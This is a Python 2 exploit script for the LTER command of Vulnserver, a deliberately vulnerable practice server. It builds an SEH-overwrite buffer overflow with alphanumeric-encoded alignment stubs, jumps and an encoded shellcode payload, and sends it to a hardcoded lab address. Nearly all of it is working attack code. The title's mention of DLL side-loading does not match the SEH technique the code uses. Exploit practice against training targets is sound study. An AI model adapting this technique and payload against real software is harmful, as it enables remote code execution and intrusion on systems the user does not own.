# Exploit for Vulnserver - LTER - DLL Side-Loading
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

alignment1  = "\x66\x05\x35\x11"       # ADD AX, 0x1135
alignment1 += "\x04\x79"               # ADD AL, 0x79
alignment1 += "\x50"                   # PUSH EAX
alignment1 += "\x5c"                   # POP ESP
short_jmp   = "\x66\x2d\x13\x7f"       # SUB AX, 0x7f13
short_jmp  += "\x50"                   # PUSH EAX

alignment2  = "\x54"                   # PUSH ESP 
alignment2 += "\x58"                   # POP EAX
alignment2 += "\x2c\x23"               # SUB AL, 0x23
alignment2 += "\x50"                   # PUSH EAX
alignment2 += "\x5c"                   # POP ESP
long_jmp    = "\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2c\x77\x27\x77\x2d"                                          
long_jmp   += "\x79\x78\x26\x79\x2d\x5c\x7f\x21\x7f\x50\x25\x50\x50\x4a\x50\x25"                                          
long_jmp   += "\x2a\x2a\x30\x2a\x2d\x76\x73\x38\x68\x2d\x3c\x65\x79\x21\x2d\x65"                                          
long_jmp   += "\x6b\x5b\x76\x50"

scbuf ="\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x65\x7f\x7d\x22\x2d"                                          
scbuf+="\x4d\x60\x75\x24\x2d\x4f\x4c\x7c\x28\x50\x25\x50\x50\x4a\x50\x25"                                          
scbuf+="\x2a\x2a\x30\x2a\x2d\x2a\x2a\x2d\x21\x2d\x2a\x3e\x27\x32\x2d\x31"                                          
scbuf+="\x7a\x2b\x30\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x4f"                                          
scbuf+="\x2a\x26\x7f\x2d\x39\x7a\x32\x59\x2d\x47\x22\x53\x6c\x50\x25\x50"                                          
scbuf+="\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x5d\x30\x27\x2c\x2d\x25\x29"                                          
scbuf+="\x3b\x3b\x2d\x48\x3e\x41\x3c\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a"                                          
scbuf+="\x30\x2a\x2d\x2d\x2b\x60\x42\x2d\x3e\x6f\x38\x31\x2d\x2d\x33\x39"                                          
scbuf+="\x5b\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x3b\x6d\x21"                                          
scbuf+="\x63\x2d\x27\x34\x63\x24\x2d\x66\x30\x4a\x45\x50\x25\x50\x50\x4a"                                          
scbuf+="\x50\x25\x2a\x2a\x30\x2a\x2d\x27\x72\x67\x35\x2d\x4c\x21\x23\x3e"                                          
scbuf+="\x2d\x5f\x3b\x43\x24\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a"                                          
scbuf+="\x2d\x32\x2d\x2d\x57\x2d\x39\x2d\x3e\x2b\x2d\x22\x3d\x2c\x47\x50"                                          
scbuf+="\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x41\x26\x3e\x2d\x2d"                                          
scbuf+="\x3e\x3b\x32\x26\x2d\x25\x36\x57\x50\x50\x25\x50\x50\x4a\x50\x25"                                          
scbuf+="\x2a\x2a\x30\x2a\x2d\x34\x25\x37\x39\x2d\x2c\x3b\x2b\x28\x2d\x38"                                          
scbuf+="\x3e\x2b\x39\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x3e"                                          
scbuf+="\x41\x21\x3d\x2d\x28\x27\x38\x23\x2d\x35\x21\x3d\x33\x50\x25\x50"                                          
scbuf+="\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x29\x2b\x2b\x2c\x2d\x38\x3e"                                          
scbuf+="\x36\x30\x2d\x3b\x2a\x32\x3b\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a"                                          
scbuf+="\x30\x2a\x2d\x6e\x3b\x23\x2a\x2d\x3c\x23\x32\x33\x2d\x7b\x4d\x42"                                          
scbuf+="\x74\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x30\x23\x26"                                          
scbuf+="\x33\x2d\x23\x7a\x36\x3c\x2d\x2a\x76\x3e\x5f\x50"

alignment3      = "\x54"                      # PUSH ESP
alignment3     += "\x58"                      # POP EAX
alignment3     += "\x66\x2d\x72\x0b"          # SUB AX, 0xB72
alignment3     += "\x50"                      # PUSH EAX
alignment3     += "\x5c"                      # POP ESP
alignment3     += "\x4c"                      # DEC ESP

cmd         = "LTER /.:/"
junk1       = "A" * (100-len(alignment3))
junk2       = "B" * 20
junk3       = "B" * (3495-100-20-90-len(scbuf))
junk4       = "C" * (90-len(alignment2+long_jmp)) 
nseh        = "\x54"                   # PUSH ESP
nseh       += "\x58"                   # POP EAX             
nseh       += "\x71\x04"               # JMP +4
seh         = "\x2b\x17\x50\x62"       # 0x6250172b : pop edi # pop ebp # ret in essfunc.dll 

first_jmp  = alignment1 + short_jmp
second_jmp = alignment2 + long_jmp

junk5      = "C" * (5000-len(cmd+junk1+junk2+nseh+seh+first_jmp+second_jmp+junk3+junk4))

buffer = cmd + junk1 + alignment3 + junk2 + scbuf + junk3 + second_jmp + junk4 + nseh + seh + first_jmp + junk5

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
